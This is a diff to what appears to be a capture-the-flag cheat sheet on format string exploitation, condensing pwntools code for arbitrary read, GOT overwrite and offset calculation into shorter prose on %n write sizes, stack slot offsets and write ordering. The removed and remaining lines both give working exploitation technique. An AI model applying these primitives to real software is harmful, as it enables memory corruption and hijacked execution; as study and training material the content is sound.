@@ -4,73 +4,17 @@
 
 ## Format String Basics
 
-- Leak stack: `%p.%p.%p.%p.%p.%p`
-- Leak specific offset: `%7$p`
-- Write value: `%n` (4-byte), `%hn` (2-byte), `%hhn` (1-byte), `%lln` (8-byte)
-- GOT overwrite for code execution
+Primitives: `%p`/`%s` to read, `%n`/`%hn`/`%hhn`/`%lln` to write 4/2/1/8 bytes; `fmtstr_payload(offset, {addr: value})` automates the write.
 
-**Write size specifiers (x86-64):**
-| Specifier | Bytes Written | Use Case |
-|-----------|---------------|----------|
-| `%n` | 4 | 32-bit values |
-| `%hn` | 2 | Split writes |
-| `%hhn` | 1 | Precise byte writes |
-| `%lln` | 8 | Full 64-bit address (clears upper bytes) |
+**The three things that actually break:**
 
-**IMPORTANT:** On x86-64, GOT entries are 8 bytes. Using `%n` (4-byte) leaves upper bytes with old libc address garbage. Use `%lln` to write full 8 bytes and zero upper bits.
+- **`%n` writes 4 bytes.** x86-64 GOT entries are 8, so `%n` leaves the upper half holding an old libc address and the next indirect call jumps into garbage. Use `%lln` (writes 8 bytes; the cost is output volume) or four `%hn`.
+- **The address slot is `6 + pad/8`** when the format string starts at the usual stack slot: bare buffer 6, 16 bytes of padding 8, 32 bytes 10, 64 bytes 14. Confirm with `%<n>$p` before writing, never assume.
+- **Output volume**: a value like `0x7f...` means that many characters. Split into 2-byte `%hn` writes and order them ascending so each field only prints the delta.
 
-**Arbitrary read primitive:**
-```python
-def arb_read(addr):
-    # %7$s reads string at address placed at offset 7
-    payload = flat({0: b'%7$s#', 8: addr})
-    io.sendline(payload)
-    return io.recvuntil(b'#')[:-1]
-```
+Read primitive: put the target address at slot `n` and use `%<n>$s`; it returns bytes up to the first NUL.
 
-**Arbitrary write primitive:**
-```python
-from pwn import fmtstr_payload
-payload = fmtstr_payload(offset, {target_addr: value})
-```
-
-**Manual GOT overwrite (x86-64):**
-```python
-# Format: %<value>c%<offset>$lln + padding + address
-# Address at offset 8 when format is 16 bytes
-
-win = 0x4011f6
-target_got = 0x404018  # e.g., printf@GOT
-
-fmt = f'%{win}c%8$lln'.encode()  # Write 'win' chars then store to offset 8
-fmt = fmt.ljust(16, b'X')        # Pad to 16 bytes (2 qwords)
-payload = fmt + p64(target_got)  # Address lands at offset 6 + 16/8 = 8
-
-# Note: This prints ~4MB of spaces - be patient waiting for output
-```
-
-**Offset calculation for addresses:**
-- Buffer typically starts at offset 6 (after register args)
-- If format string is padded to N bytes, addresses start at offset: `6 + N/8`
-- Example: 16-byte format → addresses at offset 8
-- Example: 32-byte format → addresses at offset 10
-- Example: 64-byte format → addresses at offset 14
-
-**Verify offset with test payload:**
-```python
-# Put known address after N-byte format, check with %<calculated_offset>$p
-test = b'%8$p___XXXXXXXXX'  # 16 bytes
-payload = test + p64(0xDEADBEEF)
-# Should print 0xdeadbeef if offset 8 is correct
-```
-
-**GOT target selection:**
-- If `exit@GOT` doesn't work, try other GOT entries
-- `printf@GOT`, `puts@GOT`, `putchar@GOT` are good alternatives
-- Target functions called AFTER the format string vulnerability
-- Check call order in disassembly to pick best target
-
-**Key insight:** Format string vulnerabilities are identified by sending `%p.%p.%p` as input -- if hex addresses appear in the output, the program passes user input directly as the format argument to `printf`/`sprintf`. This gives both arbitrary read (`%s` with a target address) and arbitrary write (`%n` family) primitives.
+---
 
 ## Argument Retargeting (Non-Positional %n Trick)
 
